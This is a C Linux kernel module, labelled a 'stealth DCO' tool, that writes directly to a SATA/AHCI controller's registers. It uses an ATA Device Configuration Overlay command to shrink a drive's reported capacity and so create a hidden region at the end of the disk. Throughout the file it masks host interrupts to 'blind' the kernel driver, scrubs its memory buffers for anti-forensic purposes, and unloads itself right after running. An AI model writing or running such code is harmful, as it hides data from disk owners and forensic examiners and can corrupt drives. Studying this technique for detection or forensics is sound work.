#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/io.h>
#include <linux/delay.h>
#include <linux/gfp.h>
#include <linux/mm.h>
#include <linux/pci.h>
#include <linux/libata.h>
#include <asm/cacheflush.h>

/* ------------------------------------------------------------------ *
 *  AHCI Port Configuration & Constants
 * ------------------------------------------------------------------ */
#define VBOX_AHCI_FALLBACK_PHYS 0xe1900000ULL  /* Fallback ABAR for VirtualBox */
#define AHCI_PORT_NUM     0
#define AHCI_PORT_BASE    (0x100 + (AHCI_PORT_NUM) * 0x80)

/* Port register offsets */
#define AHCI_PxCLB        0x00
#define AHCI_PxCLBU       0x04
#define AHCI_PxIS         0x10
#define AHCI_PxIE         0x14
#define AHCI_PxCMD        0x18
#define AHCI_PxTFD        0x20
#define AHCI_PxSSTS       0x28
#define AHCI_PxSERR       0x30
#define AHCI_PxCI         0x38

#define PxIS_TFES         (1U << 30)

#define NATIVE_MAX_LBA    2097152ULL
#define TAIL_TRIM_SECTORS 1000ULL
#define STEALTH_MAX_LBA   (NATIVE_MAX_LBA - TAIL_TRIM_SECTORS)
#define TARGET_INSPECT_LBA (NATIVE_MAX_LBA - 1ULL)

MODULE_LICENSE("GPL");
MODULE_AUTHOR("System Researcher");
MODULE_DESCRIPTION("Pure MMIO Transient Stealth DCO Module with Universal PCI Scanner & Fallback");

struct sata_fis_h2d {
    u8 fis_type;
    u8 pm_port_c;
    u8 command;
    u8 feature_low;
    u8 lba0, lba1, lba2, device;
    u8 lba3, lba4, lba5, feature_high;
    u8 count_low, count_high, icc, control;
    u8 aux[4];
} __packed;

struct ahci_cmd_header {
    u32 dw0;
    u32 dw1;
    u32 ctba;
    u32 ctbau;
    u32 reserved[4];
} __packed;

struct ahci_prdt_entry {
    u32 dba;
    u32 dbau;
    u32 reserved;
    u32 dbc;
} __packed;

/* ------------------------------------------------------------------ *
 *  Universal PCI ABAR Resolver with Hypervisor Fallback
 * ------------------------------------------------------------------ */
static void __iomem *get_universal_ahci_mmio(void)
{
    struct pci_dev *pdev = NULL;
    resource_size_t abar_phys;
    void __iomem *mmio = NULL;

    pr_info("[STEALTH_DCO] [*] Scanning PCI bus for storage controllers...\n");

    while ((pdev = pci_get_device(PCI_ANY_ID, PCI_ANY_ID, pdev)) != NULL) {
        u32 pci_class = pdev->class;
        pr_info("[STEALTH_DCO] [*] Found device %s: class=0x%06x\n", pci_name(pdev), pci_class);

        /* Check if Base Class is Mass Storage (0x01) */
        if ((pci_class >> 16) == 0x01) {
            abar_phys = pci_resource_start(pdev, 5);
            if (abar_phys) {
                pr_info("[STEALTH_DCO] [+] Found storage controller %s with BAR5 at 0x%llx\n",
                        pci_name(pdev), (unsigned long long)abar_phys);
                
                mmio = ioremap(abar_phys, 0x1100);
                if (mmio) {
                    pci_dev_put(pdev);
                    return mmio;
                }
            }
        }
    }

    /* Fallback for VirtualBox / emulated environments */
    pr_warn("[STEALTH_DCO] [!] Dynamic PCI scan missed active BAR5. Using fallback ABAR: 0x%llx\n", 
            VBOX_AHCI_FALLBACK_PHYS);
    
    mmio = ioremap(VBOX_AHCI_FALLBACK_PHYS, 0x1100);
    if (mmio) {
        pr_info("[STEALTH_DCO] [+] Successfully mapped fallback ABAR at 0x%llx\n", VBOX_AHCI_FALLBACK_PHYS);
        return mmio;
    }

    pr_err("[STEALTH_DCO] [-] Fatal: Failed to locate or map AHCI controller BAR5 via scan and fallback.\n");
    return NULL;
}

/* ------------------------------------------------------------------ *
 *  Helper: Robust slot execution with verbose status logging
 * ------------------------------------------------------------------ */
static int execute_ahci_slot_stealth(void *port_base, int slot, bool is_dco_set)
{
    u32 ie_orig, ci_val, tfd_val, serr_val;
    int i, max_polls = is_dco_set ? 300 : 100;

    pr_info("[STEALTH_DCO] [+] Preparing slot %d execution (DCO Set: %s)\n", slot, is_dco_set ? "YES" : "NO");

    /* 1. Mask port interrupts to blind host ISR */
    ie_orig = readl((char *)port_base + AHCI_PxIE);
    writel(0, (char *)port_base + AHCI_PxIE);
    wmb();

    /* 2. Fire command slot */
    ci_val = readl((char *)port_base + AHCI_PxCI);
    ci_val |= (1U << slot);
    writel(ci_val, (char *)port_base + AHCI_PxCI);
    wmb();

    /* 3. Poll manually for completion */
    for (i = 0; i < max_polls; i++) {
        u32 current_ci = readl((char *)port_base + AHCI_PxCI);
        tfd_val = readl((char *)port_base + AHCI_PxTFD);

        if (!(current_ci & (1U << slot)) || !(tfd_val & 0x88)) {
            pr_info("[STEALTH_DCO] [+] Slot %d completed at poll iteration %d. PxTFD: 0x%08x\n", slot, i, tfd_val);

            /* Clear pending status flags */
            writel(readl((char *)port_base + AHCI_PxIS), (char *)port_base + AHCI_PxIS);
            
            /* Clear SERR post-execution to prevent link noise */
            serr_val = readl((char *)port_base + AHCI_PxSERR);
            writel(serr_val, (char *)port_base + AHCI_PxSERR);
            wmb();

            /* Restore original interrupt mask */
            writel(ie_orig, (char *)port_base + AHCI_PxIE);
            wmb();

            return 0;
        }
        msleep(10);
    }
    
    pr_err("[STEALTH_DCO] [-] ERROR: Slot %d timed out! PxTFD: 0x%08x\n", slot, readl((char *)port_base + AHCI_PxTFD));
    
    writel(readl((char *)port_base + AHCI_PxIS), (char *)port_base + AHCI_PxIS);
    writel(ie_orig, (char *)port_base + AHCI_PxIE);
    wmb();

    return -ETIMEDOUT;
}

/* ------------------------------------------------------------------ *
 *  Init (Transient Execution with Universal Scanner)
 * ------------------------------------------------------------------ */
static int __init ahci_stealth_dco_init(void)
{
    void __iomem *abar_base = NULL;
    void *port_base = NULL;
    void *ctba_virt = NULL;
    void *data_virt = NULL;
    void *slot_virt = NULL;

    struct sata_fis_h2d    *fis;
    struct ahci_cmd_header *hdr;
    struct ahci_prdt_entry *prdt;

    u64 ctba_phys = 0, data_phys = 0, lst_phys = 0;
    u32 clb_lo, clb_hi, pxis_after, cmd_val, ssts_val;
    unsigned long ctba_page = 0, data_page = 0;
    int ret = 0;
    u8 *sector_buf;

    pr_info("[STEALTH_DCO] ==================================================\n");
    pr_info("[STEALTH_DCO] ---- UNIVERSAL SCANNER TRANSIENT DCO START ----\n");
    pr_info("[STEALTH_DCO] ==================================================\n");

    /* 1. Resolve ABAR mapping via universal scanner or fallback */
    abar_base = get_universal_ahci_mmio();
    if (!abar_base) {
        pr_err("[STEALTH_DCO] FATAL: Failed to acquire ABAR mapping\n");
        return -ENODEV;
    }
    port_base = (void *)((char *)abar_base + AHCI_PORT_BASE);

    ssts_val = readl((char *)port_base + AHCI_PxSSTS);
    pr_info("[STEALTH_DCO] [*] Port SStatus (PxSSTS): 0x%08x\n", ssts_val);

    clb_lo = readl((char *)port_base + AHCI_PxCLB);
    clb_hi = readl((char *)port_base + AHCI_PxCLBU);
    lst_phys = ((u64)clb_hi << 32) | clb_lo;
    if (!lst_phys) {
        pr_err("[STEALTH_DCO] FATAL: PxCLB is 0, port uninitialized\n");
        ret = -ENODEV;
        goto out;
    }

    ctba_page = __get_free_page(GFP_KERNEL | GFP_DMA32);
    data_page = __get_free_page(GFP_KERNEL | GFP_DMA32);
    if (!ctba_page || !data_page) {
        pr_err("[STEALTH_DCO] FATAL: Failed to allocate DMA pages\n");
        ret = -ENOMEM;
        goto out;
    }
    ctba_virt = (void *)ctba_page;
    ctba_phys = (u64)virt_to_phys(ctba_virt);
    data_virt = (void *)data_page;
    data_phys = (u64)virt_to_phys(data_virt);

    memset(ctba_virt, 0, PAGE_SIZE);
    memset(data_virt, 0, 512);

    cmd_val = readl((char *)port_base + AHCI_PxCMD);
    cmd_val |= (1U << 0) | (1U << 4);
    writel(cmd_val, (char *)port_base + AHCI_PxCMD);
    wmb();

    /* Phase 1: Inspect Tail Sector */
    pr_info("[STEALTH_DCO] --- PHASE 1: Inspecting Tail Sector (LBA: %llu) ---\n", (unsigned long long)TARGET_INSPECT_LBA);
    fis = (struct sata_fis_h2d *)ctba_virt;
    fis->fis_type    = 0x27;
    fis->pm_port_c   = 0x80;
    fis->command     = 0x25; /* READ DMA EXT */
    fis->lba0        = (u8)(TARGET_INSPECT_LBA & 0xFF);
    fis->lba1        = (u8)((TARGET_INSPECT_LBA >> 8) & 0xFF);
    fis->lba2        = (u8)((TARGET_INSPECT_LBA >> 16) & 0xFF);
    fis->device      = 0x40;
    fis->lba3        = (u8)((TARGET_INSPECT_LBA >> 24) & 0xFF);
    fis->lba4        = (u8)((TARGET_INSPECT_LBA >> 32) & 0xFF);
    fis->lba5        = (u8)((TARGET_INSPECT_LBA >> 40) & 0xFF);
    fis->count_low   = 0x01;

    prdt = (struct ahci_prdt_entry *)((char *)ctba_virt + 0x80);
    prdt->dba  = (u32)(data_phys & 0xFFFFFFFF);
    prdt->dbau = (u32)(data_phys >> 32);
    prdt->dbc  = (511 & 0x3FFFFF);

    slot_virt = memremap(lst_phys + (31 * 32), 32, MEMREMAP_WB);
    if (!slot_virt) {
        pr_err("[STEALTH_DCO] FATAL: memremap failed for command slot list\n");
        ret = -EFAULT;
        goto out;
    }

    hdr = (struct ahci_cmd_header *)slot_virt;
    hdr->dw0   = (5 & 0x1F) | (1 << 16); 
    hdr->dw1   = 0;
    hdr->ctba  = (u32)(ctba_phys & 0xFFFFFFFF);
    hdr->ctbau = (u32)(ctba_phys >> 32);
    wmb();
    memunmap(slot_virt);
    slot_virt = NULL;

    if (execute_ahci_slot_stealth(port_base, 31, false) == 0) {
        sector_buf = (u8 *)data_virt;
        if (*(u64 *)sector_buf == 0x5452415020494645ULL) {
            pr_warn("[STEALTH_DCO] [+] GPT Backup Header detected at tail boundary.\n");
        } else {
            pr_info("[STEALTH_DCO] [+] Tail sector verified successfully.\n");
        }
    } else {
        ret = -EIO;
        goto out;
    }

    /* Phase 2: DCO Micro-Trim */
    pr_info("[STEALTH_DCO] --- PHASE 2: Executing DCO Set (New Max LBA: %llu) ---\n", (unsigned long long)STEALTH_MAX_LBA);
    memset(ctba_virt, 0, 256);
    fis = (struct sata_fis_h2d *)ctba_virt;
    fis->fis_type    = 0x27;
    fis->pm_port_c   = 0x80;
    fis->command     = 0xB1; /* DEVICE CONFIGURATION */
    fis->feature_low = 0xC2; /* SET */
    fis->lba0        = (u8)(STEALTH_MAX_LBA & 0xFF);
    fis->lba1        = (u8)((STEALTH_MAX_LBA >> 8) & 0xFF);
    fis->lba2        = (u8)((STEALTH_MAX_LBA >> 16) & 0xFF);
    fis->device      = 0x40;
    fis->lba3        = (u8)((STEALTH_MAX_LBA >> 24) & 0xFF);
    fis->count_low   = 0x01;

    slot_virt = memremap(lst_phys + (31 * 32), 32, MEMREMAP_WB);
    if (!slot_virt) {
        pr_err("[STEALTH_DCO] FATAL: memremap failed for command slot list (Phase 2)\n");
        ret = -EFAULT;
        goto out;
    }

    hdr = (struct ahci_cmd_header *)slot_virt;
    hdr->dw0   = (5 & 0x1F) | (0 << 16); 
    hdr->dw1   = 0;
    hdr->ctba  = (u32)(ctba_phys & 0xFFFFFFFF);
    hdr->ctbau = (u32)(ctba_phys >> 32);
    wmb();
    memunmap(slot_virt);
    slot_virt = NULL;

    if (execute_ahci_slot_stealth(port_base, 31, true) == 0) {
        pxis_after = readl((char *)port_base + AHCI_PxIS);
        if (pxis_after & PxIS_TFES) {
            pr_err("[STEALTH_DCO] [-] Controller rejected DCO command.\n");
            ret = -EIO;
        } else {
            pr_info("[STEALTH_DCO] [++] SUCCESS: DCO applied successfully.\n");
            ret = 0;
        }
    } else {
        ret = -EIO;
    }

out:
    /* Forensic Memory Scrubbing & Cache Sanitization */
    if (slot_virt) {
        clflush_cache_range(slot_virt, 32);
        memset(slot_virt, 0, 32);
        clflush_cache_range(slot_virt, 32);
        memunmap(slot_virt);
    }
    if (ctba_virt) {
        clflush_cache_range(ctba_virt, PAGE_SIZE);
        memzero_explicit(ctba_virt, PAGE_SIZE);
        clflush_cache_range(ctba_virt, PAGE_SIZE);
        free_page(ctba_page);
    }
    if (data_virt) {
        clflush_cache_range(data_virt, 512);
        memzero_explicit(data_virt, 512);
        clflush_cache_range(data_virt, 512);
        free_page(data_page);
    }
    if (abar_base) {
        iounmap(abar_base);
    }

    pr_info("[STEALTH_DCO] ---- TRANSIENT EXECUTION FINISHED (ret=%d) ----\n", ret);

    return (ret == 0) ? -ENODEV : ret;
}

static void __exit ahci_stealth_dco_exit(void) {}

module_init(ahci_stealth_dco_init);
module_exit(ahci_stealth_dco_exit);